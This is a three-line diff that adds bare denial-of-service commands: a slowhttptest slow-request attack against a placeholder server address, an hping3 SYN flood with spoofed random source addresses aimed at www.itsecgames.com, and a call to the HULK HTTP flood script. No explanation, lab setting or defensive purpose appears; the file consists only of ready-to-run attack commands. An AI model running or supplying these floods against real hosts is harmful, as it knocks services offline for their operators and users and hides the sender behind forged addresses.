@@ -1,0 +1,3 @@
+slowhttptest -c 500 -H -g -o ./output_file -i 10 -r 200 -t GET -u http://yourwebsite-or-server-ip.com -x 24 -p 2
+hping3 www.itsecgames.com -q -n -d 120 -S -p 80 --flood --rand-source
+python3 hulk.py
